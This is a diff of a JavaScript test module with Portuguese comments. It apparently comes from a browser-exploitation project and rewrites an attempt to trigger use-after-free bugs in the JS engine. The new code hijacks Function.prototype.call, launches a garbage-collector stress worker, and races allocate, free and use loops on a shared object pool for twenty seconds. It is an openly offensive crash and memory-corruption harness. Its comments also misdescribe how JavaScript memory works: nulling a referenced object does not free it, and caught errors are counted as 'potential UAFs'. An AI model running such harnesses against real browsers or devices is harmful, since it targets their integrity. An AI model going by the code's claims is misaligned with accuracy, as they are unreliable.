@@ -1,80 +1,105 @@
 // js/script3/testAdvancedPP.mjs
-// ATUALIZADO PARA TENTATIVA AVANÇADA DE USE-AFTER-FREE (UAF) ASSÍNCRONO
+// VERSÃO FINAL: O "CALDEIRÃO" DE UAF - MODO CAOS
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
 
-const UAF_ITERATIONS = 20000; // Menos iterações, pois cada uma é mais complexa e lenta.
+const POOL_SIZE = 5000;
+const CAULDRON_DURATION_MS = 20000; // Deixe o caos reinar por 20 segundos
 
 /**
- * Tenta forçar uma condição de Use-After-Free usando setTimeout para criar uma corrida
- * entre o uso de um objeto e sua coleta pelo Garbage Collector.
+ * Cria um ambiente caótico com múltiplos loops assíncronos competindo por um pool
+ * de objetos compartilhado para forçar uma condição de Use-After-Free.
  */
-async function advanced_UAF_Attempt_With_SetTimeout() {
-    const FNAME = 'AdvancedUAF_SetTimeout';
-    logS3(`--- Tentativa Avançada de UAF com setTimeout ---`, 'test', FNAME);
-    logS3(`Iterações: ${UAF_ITERATIONS}`, 'info', FNAME);
-    const originalCallDescriptor = Object.getOwnPropertyDescriptor(Function.prototype, 'call');
-    let uafCount = 0;
-    let errorCount = 0;
+export async function runChaoticUAFCauldron() {
+    const FNAME = 'ChaoticUAFCauldron';
+    logS3(`--- MODO CAOS: Iniciando o Caldeirão de UAF ---`, 'test', FNAME);
+    logS3(`Duração: ${CAULDRON_DURATION_MS / 1000} segundos. O navegador pode não responder.`, 'critical', FNAME);
 
-    // A função que será chamada no futuro, tentando usar a vítima.
-    const useVictim = (victim) => {
-        try {
-            // O gatilho é uma chamada de função na vítima.
-            // Se a vítima já foi liberada pelo GC, esta linha pode travar o navegador.
-            Object.keys.call(victim);
-        } catch (e) {
-            // Um erro aqui é interessante. Pode significar que 'victim' não é mais um objeto válido.
-            errorCount++;
-        }
-    };
-    
+    const originalCallDescriptor = Object.getOwnPropertyDescriptor(Function.prototype, 'call');
+    const victimPool = new Array(POOL_SIZE).fill(null);
+    let intervals = [];
+    let chaosWorker;
+    let stats = { allocations: 0, frees: 0, uses: 0, potential_uaf: 0 };
+
     try {
-        const hijackFunction = () => { uafCount++; };
+        // O Hijack de 'call' agora é mais ativo: ele tenta escrever na propriedade do objeto.
+        // Escrever em memória liberada é muito mais propenso a causar um crash do que ler.
+        const hijackFunction = function() {
+            stats.uses++;
+            if (this && typeof this === 'object' && this.id) {
+                // Tentativa de escrita. Se 'this' for um ponteiro inválido, CRASH!
+                this.id = -1; 
+            }
+        };
         Object.defineProperty(Function.prototype, 'call', { value: hijackFunction, configurable: true });
 
-        logS3("Iniciando loop de UAF Assíncrono...", 'warn', FNAME);
-        logS3("Cada iteração agenda um 'uso' futuro e imediatamente 'libera' o objeto.", 'info', FNAME);
+        // 5. O TRABALHADOR DO CAOS
+        const workerScript = `
+            let memoryHog = [];
+            setInterval(() => {
+                // Aloca e libera memória para estressar o GC de outro thread
+                for(let i=0; i<100; i++) {
+                    memoryHog.push(new Uint8Array(1024));
+                }
+                if (memoryHog.length > 500) {
+                    memoryHog = [];
+                }
+            }, 50);
+        `;
+        chaosWorker = new Worker(URL.createObjectURL(new Blob([workerScript])));
+        logS3('Trabalhador do Caos (Chaos Worker) iniciado.', 'warn', FNAME);
 
-        for (let i = 0; i < UAF_ITERATIONS; i++) {
-            // 1. ALOCAR VÍTIMA
-            let victim = { id: i, payload: new Uint8Array(256) };
-
-            // 2. AGENDAR O "USO"
-            setTimeout(() => useVictim(victim), Math.random() * 10); // Adiciona um pequeno jitter aleatório
-
-            // 3. "LIBERAR" A VÍTIMA
-            victim = null;
-            
-            // 4. PRESSIONAR O GARBAGE COLLECTOR (opcional, mas ajuda)
-            // Alocar pequenos objetos força o GC a trabalhar mais.
-            let pressure = new Array(50).fill(0);
-
-            if (i % 2000 === 0) {
-                 logS3(`Progresso: ${i}/${UAF_ITERATIONS}... Usos agendados: ${uafCount}, Erros de acesso: ${errorCount}`, 'info', FNAME);
-                 await PAUSE_S3(20); // Pausa para a UI e para os timeouts se acumularem
+        // 2. O ALOCADOR
+        intervals.push(setInterval(() => {
+            const index = Math.floor(Math.random() * POOL_SIZE);
+            if (victimPool[index] === null) {
+                victimPool[index] = { id: index, payload: new Uint8Array(Math.random() * 512) };
+                stats.allocations++;
             }
-        }
+        }, 13)); // Frequências com números primos evitam sincronização
 
-        logS3("Loop de agendamento concluído. Aguardando timeouts restantes...", 'good', FNAME);
-        await PAUSE_S3(2000); // Pausa longa para garantir que a maioria dos timeouts execute.
+        // 3. O LIBERADOR
+        intervals.push(setInterval(() => {
+            const index = Math.floor(Math.random() * POOL_SIZE);
+            if (victimPool[index] !== null) {
+                victimPool[index] = null; // Libera o objeto
+                stats.frees++;
+            }
+        }, 17));
+
+        // 4. O USADOR
+        intervals.push(setInterval(() => {
+            const index = Math.floor(Math.random() * POOL_SIZE);
+            const victim = victimPool[index];
+            if (victim) {
+                // Acessa o objeto. Se o Liberador agiu entre a leitura de 'victim'
+                // e esta linha, temos uma condição de corrida.
+                try {
+                    Object.keys.call(victim);
+                } catch(e) {
+                    stats.potential_uaf++;
+                }
+            }
+        }, 7));
+        
+        logS3('Caldeirão ativado. Todos os loops estão em execução...', 'critical', FNAME);
+
+        // Aguarda a duração do teste
+        await PAUSE_S3(CAULDRON_DURATION_MS);
 
     } catch (e) {
-        logS3(`ERRO CRÍTICO durante o setup do Teste de UAF: ${e.message}`, 'error', FNAME);
+        logS3(`ERRO CRÍTICO durante o setup do Caldeirão: ${e.message}`, 'error', FNAME);
     } finally {
-        logS3("Limpando e restaurando 'call'...", 'info', FNAME);
+        logS3('Finalizando o Caldeirão. Limpando timers e worker...', 'info', FNAME);
+        intervals.forEach(clearInterval);
+        if (chaosWorker) chaosWorker.terminate();
         if (originalCallDescriptor) {
             Object.defineProperty(Function.prototype, 'call', originalCallDescriptor);
         }
-        logS3(`Total de chamadas sequestradas (pode ser menor que iterações): ${uafCount}`, 'info', FNAME);
-        logS3(`Total de erros de acesso em timeouts: ${errorCount}`, 'info', FNAME);
+        logS3('Estatísticas do Caldeirão:', 'info', FNAME);
+        logS3(`  - Alocações: ${stats.allocations}`, 'info', FNAME);
+        logS3(`  - Liberações: ${stats.frees}`, 'info', FNAME);
+        logS3(`  - Usos (chamadas sequestradas): ${stats.uses}`, 'info', FNAME);
+        logS3(`  - Potenciais UAFs (erros de acesso): ${stats.potential_uaf}`, 'warn', FNAME);
     }
-}
-
-
-/**
- * Função principal que orquestra a execução da tentativa de UAF.
- */
-export async function runAdvancedUAF_Attempts() {
-    await advanced_UAF_Attempt_With_SetTimeout();
 }
